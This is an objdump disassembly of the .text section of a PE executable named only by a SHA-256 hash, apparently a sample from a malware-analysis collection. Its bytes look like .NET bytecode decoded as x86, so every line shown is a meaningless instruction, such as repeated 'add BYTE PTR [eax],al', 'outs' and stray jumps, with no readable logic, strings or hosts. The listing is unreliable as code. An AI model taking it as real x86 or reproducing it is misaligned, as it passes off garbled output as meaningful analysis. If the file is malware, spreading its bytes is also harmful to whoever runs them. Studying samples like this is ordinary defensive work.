
2889b601d0a0bbee5951f47adc2ae627708b9004ee4aed08ce70bfef492a2f84.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	jg     0x40200b
  402002:	add    eax,0x0
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x2aac00
  402013:	add    al,bl
  402015:	sbb    al,0x0
  402017:	add    BYTE PTR [ecx],al
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ebx],cl
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	test   BYTE PTR [edi+0x0],al
  402023:	add    BYTE PTR [eax-0x3f],ah
  402026:	add    al,0x0
	...
  402050:	add    ch,BYTE PTR ss:[eax]
  402053:	adc    al,0x0
  402055:	add    BYTE PTR [edx],cl
  402057:	add    ch,BYTE PTR [eax]
  402059:	or     al,BYTE PTR [eax]
  40205b:	add    BYTE PTR [esi],al
  40205d:	sub    bl,BYTE PTR [edx]
  40205f:	sub    BYTE PTR ds:0x2a0a0000,dl
  402065:	add    BYTE PTR [eax],al
  402067:	add    BYTE PTR [ebx],dl
  402069:	xor    BYTE PTR [edx],al
  40206b:	add    BYTE PTR [ecx],bh
  40206d:	add    BYTE PTR [eax],al
  40206f:	add    BYTE PTR [ecx],al
  402071:	add    BYTE PTR [eax],al
  402073:	adc    DWORD PTR [esi],edx
  402075:	or     al,BYTE PTR [esi]
  402077:	add    bh,BYTE PTR [ebx+0x3]
  40207a:	add    BYTE PTR [eax],al
  40207c:	add    al,0x6f
  40207e:	push   ss
  40207f:	add    BYTE PTR [eax],al
  402081:	or     ah,BYTE PTR [eax+0xa]
  402084:	push   es
  402085:	add    bh,BYTE PTR [ebx+0x6]
  402088:	add    BYTE PTR [eax],al
  40208a:	add    al,0x6f
  40208c:	push   ss
  40208d:	add    BYTE PTR [eax],al
  40208f:	or     ah,BYTE PTR [eax+0xa]
  402092:	push   es
  402093:	add    bh,BYTE PTR [ebx+0x7]
  402096:	add    BYTE PTR [eax],al
  402098:	add    al,0x6f
  40209a:	push   ss
  40209b:	add    BYTE PTR [eax],al
  40209d:	or     ah,BYTE PTR [eax+0xa]
  4020a0:	add    bh,BYTE PTR [ebx+0x4]
  4020a3:	add    BYTE PTR [eax],al
  4020a5:	add    al,0x6
  4020a7:	outs   dx,DWORD PTR ds:[esi]
  4020a8:	pop    ss
  4020a9:	add    BYTE PTR [eax],al
  4020ab:	or     ch,BYTE PTR [edx]
  4020ad:	push   ds
  4020ae:	add    ch,BYTE PTR [eax]
  4020b0:	add    eax,DWORD PTR [eax]
  4020b2:	add    BYTE PTR [esi],al
  4020b4:	sub    ch,BYTE PTR [esi+0x32802]
  4020ba:	add    BYTE PTR [esi],al
  4020bc:	jb     0x4020bf
  4020be:	add    BYTE PTR [eax],al
  4020c0:	jo     0x4020ea
  4020c2:	sbb    BYTE PTR [eax],al
  4020c4:	add    BYTE PTR [edx],cl
  4020c6:	sub    al,0x18
  4020c8:	add    bh,BYTE PTR [ebx+0x6]
  4020cb:	add    BYTE PTR [eax],al
  4020cd:	add    al,0x16
  4020cf:	outs   dx,DWORD PTR ds:[esi]
  4020d0:	sbb    DWORD PTR [eax],eax
  4020d2:	add    BYTE PTR [edx],cl
  4020d4:	add    bh,BYTE PTR [ebx+0x7]
  4020d7:	add    BYTE PTR [eax],al
  4020d9:	add    al,0x16
  4020db:	outs   dx,DWORD PTR ds:[esi]
  4020dc:	sbb    DWORD PTR [eax],eax
  4020de:	add    BYTE PTR [edx],cl
  4020e0:	sub    al,BYTE PTR [eax]
  4020e2:	add    BYTE PTR [eax],al
  4020e4:	sbb    esi,DWORD PTR [eax]
  4020e6:	add    al,0x0
  4020e8:	sbb    DWORD PTR [ecx],eax
  4020ea:	add    BYTE PTR [eax],al
  4020ec:	add    al,BYTE PTR [eax]
  4020ee:	add    BYTE PTR [ecx],dl
  4020f0:	pop    ss
  4020f1:	or     al,BYTE PTR [edx]
  4020f3:	jnp    0x4020f8
  4020f5:	add    BYTE PTR [eax],al
  4020f7:	add    al,0x6f
  4020f9:	push   ss
  4020fa:	add    BYTE PTR [eax],al
  4020fc:	or     ch,BYTE PTR [ecx+ecx*2]
  4020ff:	sbb    BYTE PTR [ebp+0x1000029],cl
  402105:	and    eax,0x177216
  40210a:	add    BYTE PTR [eax-0x5e],dh
  40210d:	and    eax,0x357217
  402112:	add    BYTE PTR [eax-0x5e],dh
  402115:	or     ebx,DWORD PTR [ebx]
  402117:	sub    BYTE PTR [edx],bl
  402119:	add    BYTE PTR [eax],al
  40211b:	or     dh,BYTE PTR [edx+0x61]
  40211e:	add    BYTE PTR [eax],al
  402120:	jo     0x40214a
  402122:	sbb    eax,DWORD PTR [eax]
  402124:	add    BYTE PTR [edx],cl
  402126:	or     al,0x8
  402128:	jb     0x4020c3
  40212a:	add    BYTE PTR [eax],al
  40212c:	jo     0x402156
  40212e:	sbb    eax,DWORD PTR [eax]
  402130:	add    BYTE PTR [edx],cl
  402132:	or     eax,0x1c2808
  402137:	add    BYTE PTR [edx],cl
  402139:	or     DWORD PTR es:[edi],eax
  40213c:	sub    BYTE PTR ds:0xde0a0000,bl
  402142:	add    eax,0xde0a1626
  402147:	add    BYTE PTR [esi],al
  402149:	sub    eax,0xb17213
  40214e:	add    BYTE PTR [eax+0x72],dh
  402151:	mov    eax,0x16700001
  402156:	pop    ds
  402157:	xor    BYTE PTR [eax],ch
  402159:	push   ds
  40215a:	add    BYTE PTR [eax],al
  40215c:	or     ah,BYTE PTR [esi]
  40215e:	add    bh,BYTE PTR [ebx+0x6]
  402161:	add    BYTE PTR [eax],al
  402163:	add    al,0x6f
  402165:	push   ss
  402166:	add    BYTE PTR [eax],al
  402168:	or     ch,BYTE PTR [eax+ebx*1]
  40216b:	add    bh,BYTE PTR [ebx+0x6]
  40216e:	add    BYTE PTR [eax],al
  402170:	add    al,0x6f
  402172:	pop    ds
  402173:	add    BYTE PTR [eax],al
  402175:	or     ch,BYTE PTR [ebx+ecx*1]
  402178:	jb     0x40215e
  40217a:	add    DWORD PTR [eax],eax
  40217c:	jo     0x4021a6
  40217e:	and    BYTE PTR [eax],al
  402180:	add    BYTE PTR [edx],cl
  402182:	add    bh,BYTE PTR es:[ebx+0x7]
  402186:	add    BYTE PTR [eax],al
  402188:	add    al,0x6f
  40218a:	push   ss
  40218b:	add    BYTE PTR [eax],al
  40218d:	or     ch,BYTE PTR [edx+eiz*2]
  402190:	add    bh,BYTE PTR [ebx+0x7]
  402193:	add    BYTE PTR [eax],al
  402195:	add    al,0x6f
  402197:	pop    ds
  402198:	add    BYTE PTR [eax],al
  40219a:	or     ch,BYTE PTR [edx*2+0x217e]
  4021a1:	or     dh,BYTE PTR [edx+0x14]
  4021a4:	add    al,BYTE PTR [eax]
  4021a6:	jo     0x402217
  4021a8:	and    al,BYTE PTR [eax]
  4021aa:	add    BYTE PTR [edx],cl
  4021ac:	adc    eax,DWORD PTR [ecx+edx*1]
  4021af:	add    al,0x2c
  4021b1:	inc    eax
  4021b2:	adc    DWORD PTR [edx+esi*2],eax
  4021b5:	add    al,BYTE PTR ds:[eax]
  4021b8:	jo     0x402229
  4021ba:	and    eax,DWORD PTR [eax]
  4021bc:	add    BYTE PTR [edx],cl
  4021be:	outs   dx,DWORD PTR ds:[esi]
  4021bf:	and    al,0x0
  4021c1:	add    BYTE PTR [edx],cl
  4021c3:	jb     0x402217
  4021c5:	add    al,BYTE PTR [eax]
  4021c7:	jo     0x4021f1
  4021c9:	and    eax,0x730a0000
  4021ce:	or     al,0x0
  4021d0:	add    BYTE PTR [esi],al
  4021d2:	jb     0x40224c
  4021d4:	add    al,BYTE PTR [eax]
  4021d6:	jo     0x4021ea
  4021d8:	add    eax,0x106f
  4021dd:	push   es
  4021de:	sub    al,0x12
  4021e0:	adc    DWORD PTR ds:0x2f072,eax
  4021e6:	jo     0x402210
  4021e8:	and    eax,0x280a0000
  4021ed:	and    BYTE PTR [eax],al
  4021ef:	add    BYTE PTR [edx],cl
  4021f1:	es push es
  4021f3:	sub    al,0x13
  4021f5:	jb     0x40217c
  4021f7:	add    eax,DWORD PTR [eax]
  4021f9:	jo     0x40226d
  4021fb:	mov    eax,0x16700001
  402200:	pop    ds
  402201:	inc    eax
  402202:	sub    BYTE PTR [esi],bl
  402204:	add    BYTE PTR [eax],al
  402206:	or     ah,BYTE PTR [esi]
  402208:	sub    al,BYTE PTR [eax]
  40220a:	add    BYTE PTR [eax],al
  40220c:	add    DWORD PTR [eax],edx
  40220e:	add    BYTE PTR [eax],al
  402210:	add    BYTE PTR [eax],al
  402212:	inc    ebx
  402213:	add    BYTE PTR [eax],dl
  402215:	push   ebx
  402216:	add    BYTE PTR ds:0x1000018,al
  40221c:	jp     0x402221
  40221e:	sub    al,0x13
  402220:	add    bh,BYTE PTR [ebx+0x1]
  402223:	add    BYTE PTR [eax],al
  402225:	add    al,0x2c
  402227:	or     eax,DWORD PTR [edx]
  402229:	jnp    0x40222c
  40222b:	add    BYTE PTR [eax],al
  40222d:	add    al,0x6f
  40222f:	add    BYTE PTR es:[eax],al
  402232:	or     al,BYTE PTR [edx]
  402234:	add    ebp,DWORD PTR [eax]
  402236:	daa    
  402237:	add    BYTE PTR [eax],al
  402239:	or     ch,BYTE PTR [edx]
  40223b:	add    BYTE PTR [ebx],dl
  40223d:	xor    BYTE PTR [ebx],al
  40223f:	add    dh,dl
  402241:	add    al,0x0
  402243:	add    BYTE PTR [ebx],al
  402245:	add    BYTE PTR [eax],al
  402247:	adc    eax,edx
  402249:	add    al,BYTE PTR [eax]
  40224b:	add    BYTE PTR [edx],al
  40224d:	sub    BYTE PTR [eax],ch
  40224f:	add    BYTE PTR [eax],al
  402251:	or     dh,BYTE PTR [ebx+0x29]
  402254:	add    BYTE PTR [eax],al
  402256:	or     cl,BYTE PTR [edx]
  402258:	add    dh,BYTE PTR [ebx+0x2a]
  40225b:	add    BYTE PTR [eax],al
  40225d:	or     bh,BYTE PTR [ebp+0x2]
  402260:	add    BYTE PTR [eax],al
  402262:	add    al,0x2
  402264:	jae    0x402291
  402266:	add    BYTE PTR [eax],al
  402268:	or     bh,BYTE PTR [ebp+0x7]
  40226b:	add    BYTE PTR [eax],al
  40226d:	add    al,0x2
  40226f:	jae    0x40229c
  402271:	add    BYTE PTR [eax],al
  402273:	or     bh,BYTE PTR [ebp+0x6]
  402276:	add    BYTE PTR [eax],al
  402278:	add    al,0x2
  40227a:	jae    0x4022a7
  40227c:	add    BYTE PTR [eax],al
  40227e:	or     bh,BYTE PTR [ebp+0x3]
  402281:	add    BYTE PTR [eax],al
  402283:	add    al,0x2
  402285:	jae    0x4022b3
  402287:	add    BYTE PTR [eax],al
  402289:	or     bh,BYTE PTR [ebp+0x4]
  40228c:	add    BYTE PTR [eax],al
  40228e:	add    al,0x2
  402290:	jae    0x4022be
  402292:	add    BYTE PTR [eax],al
  402294:	or     bh,BYTE PTR [ebp+0x5]
  402297:	add    BYTE PTR [eax],al
  402299:	add    al,0x2
  40229b:	jnp    0x40229f
  40229d:	add    BYTE PTR [eax],al
  40229f:	add    al,0x6f
  4022a1:	sub    eax,0x20a0000
  4022a6:	sub    BYTE PTR ds:0x20a0000,ch
  4022ac:	jnp    0x4022b0
  4022ae:	add    BYTE PTR [eax],al
  4022b0:	add    al,0x6f
  4022b2:	add    BYTE PTR cs:[eax],al
  4022b5:	or     al,BYTE PTR [edx]
  4022b7:	jnp    0x4022c0
  4022b9:	add    BYTE PTR [eax],al
  4022bb:	add    al,0x6f
  4022bd:	das    
  4022be:	add    BYTE PTR [eax],al
  4022c0:	or     al,BYTE PTR [edx]
  4022c2:	jnp    0x4022c6
  4022c4:	add    BYTE PTR [eax],al
  4022c6:	add    al,0x6f
  4022c8:	add    BYTE PTR cs:[eax],al
  4022cb:	or     al,BYTE PTR [edx]
  4022cd:	jnp    0x4022d5
  4022cf:	add    BYTE PTR [eax],al
  4022d1:	add    al,0x6f
  4022d3:	das    
  4022d4:	add    BYTE PTR [eax],al
  4022d6:	or     al,BYTE PTR [edx]
  4022d8:	jnp    0x4022dc
  4022da:	add    BYTE PTR [eax],al
  4022dc:	add    al,0x6f
  4022de:	add    BYTE PTR cs:[eax],al
  4022e1:	or     al,BYTE PTR [edx]
  4022e3:	jnp    0x4022e8
  4022e5:	add    BYTE PTR [eax],al
  4022e7:	add    al,0x6f
  4022e9:	das    
  4022ea:	add    BYTE PTR [eax],al
  4022ec:	or     al,BYTE PTR [edx]
  4022ee:	jnp    0x4022f2
  4022f0:	add    BYTE PTR [eax],al
  4022f2:	add    al,0x1f
  4022f4:	or     al,0x1f
  4022f6:	or     al,0x73
  4022f8:	xor    BYTE PTR [eax],al
  4022fa:	add    BYTE PTR [edx],cl
  4022fc:	outs   dx,DWORD PTR ds:[esi]
  4022fd:	xor    DWORD PTR [eax],eax
  4022ff:	add    BYTE PTR [edx],cl
  402301:	add    bh,BYTE PTR [ebx+0x2]
  402304:	add    BYTE PTR [eax],al
  402306:	add    al,0x72
  402308:	test   eax,0x6f700003
  40230d:	xor    al,BYTE PTR [eax]
  40230f:	add    BYTE PTR [edx],cl
  402311:	add    bh,BYTE PTR [ebx+0x2]
  402314:	add    BYTE PTR [eax],al
  402316:	add    al,0x20
  402318:	add    al,0x1
  40231a:	add    BYTE PTR [eax],al
  40231c:	pop    ds
  40231d:	pop    ebx
  40231e:	jae    0x402353
  402320:	add    BYTE PTR [eax],al
  402322:	or     ch,BYTE PTR [edi+0x34]
  402325:	add    BYTE PTR [eax],al
  402327:	or     al,BYTE PTR [edx]
  402329:	jnp    0x40232d
  40232b:	add    BYTE PTR [eax],al
  40232d:	add    al,0x16
  40232f:	outs   dx,DWORD PTR ds:[esi]
  402330:	xor    eax,0x20a0000
  402335:	jnp    0x402339
  402337:	add    BYTE PTR [eax],al
  402339:	add    al,0x16
  40233b:	outs   dx,DWORD PTR ds:[esi]
  40233c:	add    BYTE PTR ss:[eax],al
  40233f:	or     al,BYTE PTR [edx]
  402341:	jnp    0x402345
  402343:	add    BYTE PTR [eax],al
  402345:	add    al,0x72
  402347:	mov    ebp,0x6f700003
  40234c:	aaa    
  40234d:	add    BYTE PTR [eax],al
  40234f:	or     al,BYTE PTR [edx]
  402351:	jnp    0x40235a
  402353:	add    BYTE PTR [eax],al
  402355:	add    al,0x17
  402357:	outs   dx,DWORD PTR ds:[esi]
  402358:	cmp    BYTE PTR [eax],al
  40235a:	add    BYTE PTR [edx],cl
  40235c:	add    bh,BYTE PTR [ebx+0x7]
  40235f:	add    BYTE PTR [eax],al
  402361:	add    al,0x1e
  402363:	pop    ds
  402364:	inc    ebx
  402365:	jae    0x402397
  402367:	add    BYTE PTR [eax],al
  402369:	or     ch,BYTE PTR [edi+0x31]
  40236c:	add    BYTE PTR [eax],al
  40236e:	or     al,BYTE PTR [edx]
  402370:	jnp    0x402379
  402372:	add    BYTE PTR [eax],al
  402374:	add    al,0x72
  402376:	rol    DWORD PTR [ebx],1
  402378:	add    BYTE PTR [eax+0x6f],dh
  40237b:	xor    al,BYTE PTR [eax]
  40237d:	add    BYTE PTR [edx],cl
  40237f:	add    bh,BYTE PTR [ebx+0x7]
  402382:	add    BYTE PTR [eax],al
  402384:	add    al,0x1f
  402386:	fs pop ds
  402388:	adc    DWORD PTR [ebx+0x33],esi
  40238b:	add    BYTE PTR [eax],al
  40238d:	or     ch,BYTE PTR [edi+0x34]
  402390:	add    BYTE PTR [eax],al
  402392:	or     al,BYTE PTR [edx]
  402394:	jnp    0x40239d
  402396:	add    BYTE PTR [eax],al
  402398:	add    al,0x1a
  40239a:	outs   dx,DWORD PTR ds:[esi]
  40239b:	xor    eax,0x20a0000
  4023a0:	jnp    0x4023a9
  4023a2:	add    BYTE PTR [eax],al
  4023a4:	add    al,0x72
  4023a6:	inc    DWORD PTR [ebx]
  4023a8:	add    BYTE PTR [eax+0x6f],dh
  4023ab:	aaa    
  4023ac:	add    BYTE PTR [eax],al
  4023ae:	or     al,BYTE PTR [edx]
  4023b0:	jnp    0x4023b9
  4023b2:	add    BYTE PTR [eax],al
  4023b4:	add    al,0x17
  4023b6:	outs   dx,DWORD PTR ds:[esi]
  4023b7:	cmp    DWORD PTR [eax],eax
  4023b9:	add    BYTE PTR [edx],cl
  4023bb:	add    bh,BYTE PTR [ebx+0x7]
  4023be:	add    BYTE PTR [eax],al
  4023c0:	add    al,0x2
  4023c2:	inc    BYTE PTR [esi]
  4023c4:	push   es
  4023c5:	add    BYTE PTR [eax],al
  4023c7:	push   es
  4023c8:	jae    0x402404
  4023ca:	add    BYTE PTR [eax],al
  4023cc:	or     ch,BYTE PTR [edi+0x3b]
  4023cf:	add    BYTE PTR [eax],al
  4023d1:	or     al,BYTE PTR [edx]
  4023d3:	jnp    0x4023db
  4023d5:	add    BYTE PTR [eax],al
  4023d7:	add    al,0x17
  4023d9:	outs   dx,DWORD PTR ds:[esi]
  4023da:	cmp    BYTE PTR [eax],al
  4023dc:	add    BYTE PTR [edx],cl
  4023de:	add    bh,BYTE PTR [ebx+0x6]
  4023e1:	add    BYTE PTR [eax],al
  4023e3:	add    al,0x17
  4023e5:	outs   dx,DWORD PTR ds:[esi]
  4023e6:	cmp    al,0x0
  4023e8:	add    BYTE PTR [edx],cl
  4023ea:	add    bh,BYTE PTR [ebx+0x6]
  4023ed:	add    BYTE PTR [eax],al
  4023ef:	add    al,0x17
  4023f1:	outs   dx,DWORD PTR ds:[esi]
  4023f2:	cmp    eax,0x20a0000
  4023f7:	jnp    0x4023ff
  4023f9:	add    BYTE PTR [eax],al
  4023fb:	add    al,0x1e
  4023fd:	pop    ds
  4023fe:	sub    al,0x73
  402400:	xor    BYTE PTR [eax],al
  402402:	add    BYTE PTR [edx],cl
  402404:	outs   dx,DWORD PTR ds:[esi]
  402405:	xor    DWORD PTR [eax],eax
  402407:	add    BYTE PTR [edx],cl
  402409:	add    bh,BYTE PTR [ebx+0x6]
  40240c:	add    BYTE PTR [eax],al
  40240e:	add    al,0x72
  402410:	and    DWORD PTR [eax+eax*1],eax
  402413:	jo     0x402484
  402415:	xor    al,BYTE PTR [eax]
  402417:	add    BYTE PTR [edx],cl
  402419:	add    bh,BYTE PTR [ebx+0x6]
  40241c:	add    BYTE PTR [eax],al
  40241e:	add    al,0x1f
  402420:	imul   ebx,DWORD PTR [edi],0x11
  402423:	jae    0x402458
  402425:	add    BYTE PTR [eax],al
  402427:	or     ch,BYTE PTR [edi+0x34]
  40242a:	add    BYTE PTR [eax],al
  40242c:	or     al,BYTE PTR [edx]
  40242e:	jnp    0x402436
  402430:	add    BYTE PTR [eax],al
  402432:	add    al,0x19
  402434:	outs   dx,DWORD PTR ds:[esi]
  402435:	xor    eax,0x20a0000
  40243a:	jnp    0x402442
  40243c:	add    BYTE PTR [eax],al
  40243e:	add    al,0x72
  402440:	inc    ebx
  402441:	add    al,0x0
  402443:	jo     0x4024b4
  402445:	aaa    
  402446:	add    BYTE PTR [eax],al
  402448:	or     al,BYTE PTR [edx]
  40244a:	jnp    0x402452
  40244c:	add    BYTE PTR [eax],al
  40244e:	add    al,0x17
  402450:	outs   dx,DWORD PTR ds:[esi]
  402451:	cmp    DWORD PTR [eax],eax
  402453:	add    BYTE PTR [edx],cl
  402455:	add    bh,BYTE PTR [ebx+0x6]
  402458:	add    BYTE PTR [eax],al
  40245a:	add    al,0x2
  40245c:	inc    BYTE PTR [esi]
  40245e:	add    eax,0x73060000
  402463:	cmp    al,BYTE PTR [eax]
  402465:	add    BYTE PTR [edx],cl
  402467:	outs   dx,DWORD PTR ds:[esi]
  402468:	cmp    eax,DWORD PTR [eax]
  40246a:	add    BYTE PTR [edx],cl
  40246c:	add    bh,BYTE PTR [ebx+0x3]
  40246f:	add    BYTE PTR [eax],al
  402471:	add    al,0x17
  402473:	outs   dx,DWORD PTR ds:[esi]
  402474:	cmp    BYTE PTR [eax],al
  402476:	add    BYTE PTR [edx],cl
  402478:	add    bh,BYTE PTR [ebx+0x3]
  40247b:	add    BYTE PTR [eax],al
  40247d:	add    al,0x17
  40247f:	outs   dx,DWORD PTR ds:[esi]
  402480:	cmp    al,0x0
  402482:	add    BYTE PTR [edx],cl
  402484:	add    bh,BYTE PTR [ebx+0x3]
  402487:	add    BYTE PTR [eax],al
  402489:	add    al,0x17
  40248b:	outs   dx,DWORD PTR ds:[esi]
  40248c:	cmp    eax,0x20a0000
  402491:	jnp    0x402496
  402493:	add    BYTE PTR [eax],al
  402495:	add    al,0x1e
  402497:	pop    ds
  402498:	adc    eax,0x3073
  40249d:	or     ch,BYTE PTR [edi+0x31]
  4024a0:	add    BYTE PTR [eax],al
  4024a2:	or     al,BYTE PTR [edx]
  4024a4:	jnp    0x4024a9
  4024a6:	add    BYTE PTR [eax],al
  4024a8:	add    al,0x72
  4024aa:	addr16 add al,0x0
  4024ad:	jo     0x40251e
  4024af:	xor    al,BYTE PTR [eax]
  4024b1:	add    BYTE PTR [edx],cl
  4024b3:	add    bh,BYTE PTR [ebx+0x3]
  4024b6:	add    BYTE PTR [eax],al
  4024b8:	add    al,0x1f
  4024ba:	pop    edi
  4024bb:	pop    ds
  4024bc:	adc    DWORD PTR [ebx+0x33],esi
  4024bf:	add    BYTE PTR [eax],al
  4024c1:	or     ch,BYTE PTR [edi+0x34]
  4024c4:	add    BYTE PTR [eax],al
  4024c6:	or     al,BYTE PTR [edx]
  4024c8:	jnp    0x4024cd
  4024ca:	add    BYTE PTR [eax],al
  4024cc:	add    al,0x18
  4024ce:	outs   dx,DWORD PTR ds:[esi]
  4024cf:	xor    eax,0x20a0000
  4024d4:	jnp    0x4024d9
  4024d6:	add    BYTE PTR [eax],al
  4024d8:	add    al,0x72
  4024da:	lea    eax,[eax+eax*1]
  4024dd:	jo     0x40254e
  4024df:	aaa    
  4024e0:	add    BYTE PTR [eax],al
  4024e2:	or     al,BYTE PTR [edx]
  4024e4:	jnp    0x4024e9
  4024e6:	add    BYTE PTR [eax],al
  4024e8:	add    al,0x17
  4024ea:	outs   dx,DWORD PTR ds:[esi]
  4024eb:	cmp    DWORD PTR [eax],eax
  4024ed:	add    BYTE PTR [edx],cl
  4024ef:	add    bh,BYTE PTR [ebx+0x3]
  4024f2:	add    BYTE PTR [eax],al
  4024f4:	add    al,0x2
  4024f6:	inc    BYTE PTR [esi]
  4024f8:	add    al,0x0
  4024fa:	add    BYTE PTR [esi],al
  4024fc:	jae    0x402538
  4024fe:	add    BYTE PTR [eax],al
  402500:	or     ch,BYTE PTR [edi+0x3b]
  402503:	add    BYTE PTR [eax],al
  402505:	or     al,BYTE PTR [edx]
  402507:	jnp    0x40250d
  402509:	add    BYTE PTR [eax],al
  40250b:	add    al,0x1f
  40250d:	or     ch,BYTE PTR [edi+0x3e]
  402510:	add    BYTE PTR [eax],al
  402512:	or     al,BYTE PTR [edx]
  402514:	jnp    0x40251a
  402516:	add    BYTE PTR [eax],al
  402518:	add    al,0x16
  40251a:	outs   dx,DWORD PTR ds:[esi]
  40251b:	pop    ss
  40251c:	add    BYTE PTR [eax],al
  40251e:	or     al,BYTE PTR [edx]
  402520:	jnp    0x402526
  402522:	add    BYTE PTR [eax],al
  402524:	add    al,0x1f
  402526:	je     0x402547
  402528:	jo     0x40259d
  40252a:	xor    BYTE PTR [eax],al
  40252c:	add    BYTE PTR [edx],cl
  40252e:	outs   dx,DWORD PTR ds:[esi]
  40252f:	xor    DWORD PTR [eax],eax
  402531:	add    BYTE PTR [edx],cl
  402533:	add    bh,BYTE PTR [ebx+0x4]
  402536:	add    BYTE PTR [eax],al
  402538:	add    al,0x72
  40253a:	stos   DWORD PTR es:[edi],eax
  40253b:	add    al,0x0
  40253d:	jo     0x4025ae
  40253f:	xor    al,BYTE PTR [eax]
  402541:	add    BYTE PTR [edx],cl
  402543:	add    bh,BYTE PTR [ebx+0x4]
  402546:	add    BYTE PTR [eax],al
  402548:	add    al,0x1f
  40254a:	dec    ebx
  40254b:	pop    ds
  40254c:	pop    ss
  40254d:	jae    0x402582
  40254f:	add    BYTE PTR [eax],al
  402551:	or     ch,BYTE PTR [edi+0x34]
  402554:	add    BYTE PTR [eax],al
  402556:	or     al,BYTE PTR [edx]
  402558:	jnp    0x40255e
  40255a:	add    BYTE PTR [eax],al
  40255c:	add    al,0x17
  40255e:	outs   dx,DWORD PTR ds:[esi]
  40255f:	xor    eax,0x20a0000
  402564:	jnp    0x40256a
  402566:	add    BYTE PTR [eax],al
  402568:	add    al,0x72
  40256a:	lds    eax,FWORD PTR [eax+eax*1]
  40256d:	jo     0x4025de
  40256f:	aaa    
  402570:	add    BYTE PTR [eax],al
  402572:	or     al,BYTE PTR [edx]
  402574:	jnp    0x40257a
  402576:	add    BYTE PTR [eax],al
  402578:	add    al,0x17
  40257a:	outs   dx,DWORD PTR ds:[esi]
  40257b:	cmp    DWORD PTR [eax],eax
  40257d:	add    BYTE PTR [edx],cl
  40257f:	add    bh,BYTE PTR [ebx+0x4]
  402582:	add    BYTE PTR [eax],al
  402584:	add    al,0x2
  402586:	inc    BYTE PTR [esi]
  402588:	or     BYTE PTR [eax],al
  40258a:	add    BYTE PTR [esi],al
  40258c:	jae    0x4025c8
  40258e:	add    BYTE PTR [eax],al
  402590:	or     ch,BYTE PTR [edi+0x3f]
  402593:	add    BYTE PTR [eax],al
  402595:	or     al,BYTE PTR [edx]
  402597:	jnp    0x40259e
  402599:	add    BYTE PTR [eax],al
  40259b:	add    al,0x1f
  40259d:	or     ch,BYTE PTR [edi+0x3e]
  4025a0:	add    BYTE PTR [eax],al
  4025a2:	or     al,BYTE PTR [edx]
  4025a4:	jnp    0x4025ab
  4025a6:	add    BYTE PTR [eax],al
  4025a8:	add    al,0x18
  4025aa:	outs   dx,DWORD PTR ds:[esi]
  4025ab:	inc    eax
  4025ac:	add    BYTE PTR [eax],al
  4025ae:	or     al,BYTE PTR [edx]
  4025b0:	jnp    0x4025b7
  4025b2:	add    BYTE PTR [eax],al
  4025b4:	add    al,0x20
  4025b6:	lds    eax,FWORD PTR [eax]
  4025b8:	add    BYTE PTR [eax],al
  4025ba:	pop    ds
  4025bb:	jo     0x402630
  4025bd:	xor    BYTE PTR [eax],al
  4025bf:	add    BYTE PTR [edx],cl
  4025c1:	outs   dx,DWORD PTR ds:[esi]
  4025c2:	xor    DWORD PTR [eax],eax
  4025c4:	add    BYTE PTR [edx],cl
  4025c6:	add    bh,BYTE PTR [ebx+0x5]
  4025c9:	add    BYTE PTR [eax],al
  4025cb:	add    al,0x72
  4025cd:	rol    DWORD PTR [eax+eax*1],cl
  4025d0:	jo     0x402641
  4025d2:	xor    al,BYTE PTR [eax]
  4025d4:	add    BYTE PTR [edx],cl
  4025d6:	add    bh,BYTE PTR [ebx+0x5]
  4025d9:	add    BYTE PTR [eax],al
  4025db:	add    al,0x1f
  4025dd:	dec    ebx
  4025de:	pop    ds
  4025df:	pop    ss
  4025e0:	jae    0x402615
  4025e2:	add    BYTE PTR [eax],al
  4025e4:	or     ch,BYTE PTR [edi+0x34]
  4025e7:	add    BYTE PTR [eax],al
  4025e9:	or     al,BYTE PTR [edx]
  4025eb:	jnp    0x4025f2
  4025ed:	add    BYTE PTR [eax],al
  4025ef:	add    al,0x16
  4025f1:	outs   dx,DWORD PTR ds:[esi]
  4025f2:	xor    eax,0x20a0000
  4025f7:	jnp    0x4025fe
  4025f9:	add    BYTE PTR [eax],al
  4025fb:	add    al,0x72
  4025fd:	jmp    0x402603
  4025ff:	add    BYTE PTR [eax+0x6f],dh
  402602:	aaa    
  402603:	add    BYTE PTR [eax],al
  402605:	or     al,BYTE PTR [edx]
  402607:	jnp    0x40260e
  402609:	add    BYTE PTR [eax],al
  40260b:	add    al,0x17
  40260d:	outs   dx,DWORD PTR ds:[esi]
  40260e:	cmp    DWORD PTR [eax],eax
  402610:	add    BYTE PTR [edx],cl
  402612:	add    bh,BYTE PTR [ebx+0x5]
  402615:	add    BYTE PTR [eax],al
  402617:	add    al,0x2
  402619:	inc    BYTE PTR [esi]
  40261b:	add    al,BYTE PTR [eax]
  40261d:	add    BYTE PTR [esi],al
  40261f:	jae    0x40265b
  402621:	add    BYTE PTR [eax],al
  402623:	or     ch,BYTE PTR [edi+0x3f]
  402626:	add    BYTE PTR [eax],al
  402628:	or     al,BYTE PTR [edx]
  40262a:	add    bh,BYTE PTR [ebx+0x4]
  40262d:	add    BYTE PTR [eax],al
  40262f:	add    al,0x28
  402631:	inc    ecx
  402632:	add    BYTE PTR [eax],al
  402634:	or     al,BYTE PTR [edx]
  402636:	and    al,BYTE PTR [eax]
  402638:	add    al,al
  40263a:	inc    eax
  40263b:	and    al,BYTE PTR [eax]
  40263d:	add    BYTE PTR [eax+0x41],dl
  402640:	jae    0x402684
  402642:	add    BYTE PTR [eax],al
  402644:	or     ch,BYTE PTR [eax]
  402646:	inc    ebx
  402647:	add    BYTE PTR [eax],al
  402649:	or     al,BYTE PTR [edx]
  40264b:	pop    ss
  40264c:	sub    BYTE PTR [eax+eax*1+0x0],al
  402650:	or     al,BYTE PTR [edx]
  402652:	add    bh,BYTE PTR [ebx+0x5]
  402655:	add    BYTE PTR [eax],al
  402657:	add    al,0x28
  402659:	inc    ebp
  40265a:	add    BYTE PTR [eax],al
  40265c:	or     al,BYTE PTR [edx]
  40265e:	and    BYTE PTR [ecx+eax*1],bl
  402661:	add    BYTE PTR [eax],al
  402663:	and    BYTE PTR [ecx+0x73000000],dl
  402669:	xor    eax,DWORD PTR [eax]
  40266b:	add    BYTE PTR [edx],cl
  40266d:	sub    BYTE PTR [esi+0x0],al
  402670:	add    BYTE PTR [edx],cl
